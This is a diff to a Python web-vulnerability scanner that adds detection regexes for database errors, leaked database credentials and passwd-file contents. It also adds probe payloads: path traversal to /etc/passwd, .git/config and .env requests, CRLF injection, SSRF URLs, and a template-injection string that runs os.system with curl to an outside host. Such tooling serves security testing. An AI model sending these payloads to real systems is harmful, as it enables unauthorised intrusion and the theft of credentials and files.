@@ -126,8 +126,14 @@ def regexchecks(responsebody, url):
         founddebug.add(str(url.rstrip('\n') + alertname))
     #IBM Websphere
     if re.search(r'IBM HTTP Server', responsebody):
-        alertname = " Alert:LOW - Default IBM Websphere Page" + "\r\n"
+        alertname = " Alert:HIGH - Default IBM Websphere Page" + "\r\n"
         if re.search(r'COPYRIGHT International Business Machines', responsebody, re.IGNORECASE):
+            dualprint(Fore.RED + alertname)
+            alertHighset.add(str(url.rstrip('\n') + alertname))
+    # PHP fatal error
+    if re.search(r'fatal error', responsebody, re.IGNORECASE):
+        alertname = " Alert:HIGH - PHP fatal error" + "\r\n"
+        if re.search(r'php', responsebody, re.IGNORECASE):
             dualprint(Fore.RED + alertname)
             alertHighset.add(str(url.rstrip('\n') + alertname))
     # the debug and parsing need tuning
@@ -143,22 +149,22 @@ def regexchecks(responsebody, url):
                     alertLowset.add(str(url.rstrip('\n') + alertname))
                     founddebug.add(str(url.rstrip('\n') + alertname))
     if re.search(r'(error|serialize|parse|parsing|validat)', responsebody, re.IGNORECASE):
-        if re.search(r'(404)', responsebody, re.IGNORECASE):
+        if re.search(r'(404|HTTP Status 400|Bad Request|error.aspx)', responsebody, re.IGNORECASE):
             alertname = ""
         else:
-            alertname = " Alert:MEDIUM - Server side parsing error" + "\r\n"
+            alertname = " Alert:HIGH - Server side parsing error" + "\r\n"
             if re.search(r'( json|java)', responsebody.replace("javascript",""), re.IGNORECASE) and len(responsebody) < 3000:
                 dualprint(Fore.RED + alertname)
-                alertMedset.add(str(url.rstrip('\n') + alertname))
+                alertHighset.add(str(url.rstrip('\n') + alertname))
                 foundparsing.add(str(url.rstrip('\n') + alertname))
     if re.search(r'(error|serialize|parse|parsing|validat|stacktrace|lucee)', responsebody, re.IGNORECASE):
-        if re.search(r'(404)', responsebody, re.IGNORECASE):
+        if re.search(r'(404|HTTP Status 400|Bad Request|error.aspx)', responsebody, re.IGNORECASE):
             alertname = ""
         else:
-            alertname = " Alert:MEDIUM - Server side parsing error" + "\r\n"
+            alertname = " Alert:HIGH - Server side parsing error" + "\r\n"
             if re.search(r'(apache.tomcat|java.lang.Thread|apache.catalina)', responsebody.replace("javascript",""), re.IGNORECASE) and len(responsebody) < 30000:
                 dualprint(Fore.RED + alertname)
-                alertMedset.add(str(url.rstrip('\n') + alertname))
+                alertHighset.add(str(url.rstrip('\n') + alertname))
                 foundparsing.add(str(url.rstrip('\n') + alertname))
     if re.search(r'(error|parse|parsing|validat)', responsebody, re.IGNORECASE):
         if re.search(r'(SQL )', responsebody, re.IGNORECASE):
@@ -177,12 +183,13 @@ def regexchecks(responsebody, url):
     DBMS_ERRORS = {                                                                     # regular expressions used for DBMS recognition based on error message response
     "MySQL": (r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"valid MySQL result", r"MySqlClient\."),
     "PostgreSQL": (r"PostgreSQL.*ERROR", r"Warning.*\Wpg_.*", r"valid PostgreSQL result", r"Npgsql\."),
-    "Microsoft SQL Server": (r"Driver.* SQL[\-\_\ ]*Server", r"OLE DB.* SQL Server", r"(\W|\A)SQL Server.*Driver", r"Warning.*mssql_.*", r"(\W|\A)SQL Server.*[0-9a-fA-F]{8}", r"(?s)Exception.*\WSystem\.Data\.SqlClient\.", r"(?s)Exception.*\WRoadhouse\.Cms\."),
+    "Microsoft SQL Server": (r"Driver.* SQL[\-\_\ ]*Server", r"OLE DB.* SQL Server", r"(\W|\A)SQL Server.*Driver", r"Warning.*mssql_.*", r"(\W|\A)SQL Server.*[0-9a-fA-F]{8}", r"(?s)Exception.*\WSystem\.Data\.SqlClient\.", r"(?s)Exception.*\WRoadhouse\.Cms\.","data types NULL and NULL are incompatible"),
     "Microsoft Access": (r"Microsoft Access Driver", r"JET Database Engine", r"Access Database Engine"),
     "Oracle": (r"\bORA-[0-9][0-9][0-9][0-9]", r"Oracle error", r"Oracle.*Driver", r"Warning.*\Woci_.*", r"Warning.*\Wora_.*"),
     "IBM DB2": (r"CLI Driver.*DB2", r"DB2 SQL error", r"\bdb2_\w+\("),
     "SQLite": (r"SQLite/JDBCDriver", r"SQLite.Exception", r"System.Data.SQLite.SQLiteException", r"Warning.*sqlite_.*", r"Warning.*SQLite3::", r"\[SQLITE_ERROR\]"),
     "Sybase": (r"(?i)Warning.*sybase.*", r"Sybase message", r"Sybase.*Server message.*"),
+    "MariaDB": (r"SQLSTATE.*", "error in your SQL syntax.*"),
     }
     for (dbms, regex) in ((dbms, regex) for dbms in DBMS_ERRORS for regex in DBMS_ERRORS[dbms]):
         if re.search(regex, responsebody, re.I):
@@ -206,6 +213,11 @@ def regexchecks(responsebody, url):
                 dualprint(Fore.RED + alertname)
                 alertHighset.add(str(url.rstrip('\n') + alertname))
                 foundlrgdata.add(str(url.rstrip('\n')))
+    if re.search(r'(DB.USER|DATABASE.USER|SQL.USER|REDSHIFT.USER)', responsebody, re.IGNORECASE):
+        alertname = " Alert:HIGH - Possible Database Connection Information" + "\r\n"
+        if re.search(r'(DB.PASS|DATABASE.PASSORD|SQL.PASS|REDSHIFT.PASS)', responsebody, re.IGNORECASE):
+            dualprint(Fore.RED + alertname)
+            alertHighset.add(str(url.rstrip('\n') + alertname))
     if re.search(r'JBWEB0000', responsebody):
         alertname = " Alert:HIGH - Possible JBOSS Error Page Found" + "\r\n"
         dualprint(Fore.RED + alertname)
@@ -213,7 +225,7 @@ def regexchecks(responsebody, url):
         founddebug.add(str(url.rstrip('\n') + alertname))
     if re.search(r'(apikey|api.key)', responsebody.replace("hapikey%3D1bb39c89","").replace("hapikey=1bb39c89","").replace("hapikey%253D1bb39c89","").replace("apikey%3Dx278fxx0xx046723","").replace("apikey%253Dx278fxx0xx046723","").replace("apikey=x278fxx0xx046723",""), re.IGNORECASE):
         alertname = " Alert:HIGH - Possible API Key Found" + "\r\n"
-        regresult = re.search(r'(apikey|api.key)(=| |:|\")+\S+(=| |:|\")+', responsebody.replace("hapikey%3D1xx39x89","").replace("hapikey=1xx39x89","").replace("hapikey%253D1xx39x89","").replace("apikey%3Dx278fxx0xx046723","").replace("apikey%253Dx278fxx0xx046723","").replace("apikey=x278fxx0xx046723",""), re.IGNORECASE)
+        regresult = re.search(r'(apikey|api.key)(=| |:|\")+\S+(=| |:|\")+', responsebody.replace("hapikey%3D1xx39x89","").replace("hapikey=1xx39x89","").replace("hapikey%253D1xx39x89","").replace("apikey%3Dx278fxx0xx046723","").replace("apikey%253Dx278fxx0xx046723","").replace("apikey=x278fxx0xx046723","").replace("api_key%3Dx278fxx0xx046723%3D","").replace("api_key=x278fxx0xx046723",""), re.IGNORECASE)
         regexsecret = regresult.group(0)
         if regexsecret in foundsecrets:
             foundsecrets.add(regexsecret)
@@ -275,7 +287,7 @@ def regexchecks(responsebody, url):
                         foundpaths.add(regresult.group(0))
                         dualprint(regresult.group(0).strip().replace("\"","").replace(":","").replace(" ","").replace("../","").replace("&amp","")[:-1])
     #if re.search(r'\S+@\S+', responsebody):
-    if re.search(r'root:x', responsebody):
+    if re.search(r'(root:x|root:*|daemon:x|daemon:*|nobody:x|nobody:*|web:x|web:*)', responsebody, re.IGNORECASE):
         alertname = " Alert:HIGH - Possible Local File Inclusion" + "\r\n"
         if re.search(r'passwd', url):
             dualprint(Fore.RED + alertname)
@@ -628,13 +640,14 @@ def badstrings(url):
     dualprint("Testing some bad strings")
     bad_strings = [
     "test","http%3A%2F%2Fwww.example.com","|","'",
-    "#","..;","..;/x","%00",
-    "&","..","%","???",
+    "#","..;","..;/x","%00","%22","/////../../../../etc/passwd",
+    "&","..","%","https%3A%2F%2Fssrftest.com%2fx%2f1sUvc.jpeg%3F",
     "*","%2e%2e%2f%23","%23","%3Fcanary%3Dx%26",
-    ".json",".xml","../","%0d%0a","////////../../../etc/passwd",
+    ".json",".xml","%0d%0a","..;/..;/admin","api/v1/..","api/v2/..",
     "actuator/heapdump","%3Fhapikey%3D1bb39c89-c39f-465a-b278-fae018046723%26limit%3D",
-    "%3Fapikey%3Dx278fxx0xx046723%3D","%C9","%252e%252e%252f",".git",".env",
-    "/etc/passwd","%3Fapi_key%3Dx278fxx0xx046723%3D"
+    "%3Fapikey%3Dx278fxx0xx046723%3D","%C9","%252e%252e%252f",".git/config",".env",
+    "/etc/passwd","%3Fapi_key%3Dx278fxx0xx046723%3D","%0d%0aLocation%3A%20https%3A%2F%2Fwww.example.com",
+    "{{%20self.__init__.__globals__.__builtins__.__import__('os').system('curl%20https%3A%2F%2Fssrftest.com%2fx%2f1sUvc.jpg%3F')%20}}"
     ]
     for badstring in bad_strings:
         urlbase = urlparse(url).scheme + "://" +  urlparse(url).netloc
@@ -697,7 +710,15 @@ def testparams(url):
             testurl(newurl, 1)
             time.sleep(sleepamt)
         for params in currparams:
+            newurl = url.replace(params,params.replace("=","=https%3A%2F%2Fssrftest.com%2fx%2f1sUvc.html%3F"))
+            testurl(newurl, 1)
+            time.sleep(sleepamt)
+        for params in currparams:
             newurl = url.replace(params,params.replace("=","=%27%3b"))
+            testurl(newurl, 1)
+            time.sleep(sleepamt)
+        for params in currparams:
+            newurl = url.replace(params,params.replace("=","=Null|Null"))
             testurl(newurl, 1)
             time.sleep(sleepamt)
     dualprint(Fore.WHITE)
@@ -717,7 +738,7 @@ def testheaders(url):
     dualprint("")
     test_headers = ["X-Forwarded-Proto","X-Original-URL","X-Custom-IP-Authorization","token",
     "X-Forwarded-Port","Max-Forwards0","Max-Forwards1","Max-Forwards2","Content-Type",
-    "Referrer","Accept","User-Agent"
+    "Referrer","Accept","User-Agent","X-Forwarded-Host","Origin"
     ]
     #Check for responses with some intersting headers
     try:
@@ -768,6 +789,10 @@ def testheaders(url):
                 test_value = "multipart/*"
             if (test == "User-Agent"):
                 test_value = "okhttp/4.1.1"
+            if (test == "X-Forwarded-Host"):
+                test_value = "127.0.0.1"
+            if (test == "Origin"):
+                test_value = parsed.scheme + "://" + parsed.netloc
             rqobj = urlreq.Request(newurl, None)
             rqobj.add_header(test, test_value)
             dualprint(Fore.GREEN + str("Trying " + test + " with " + test_value + " "))
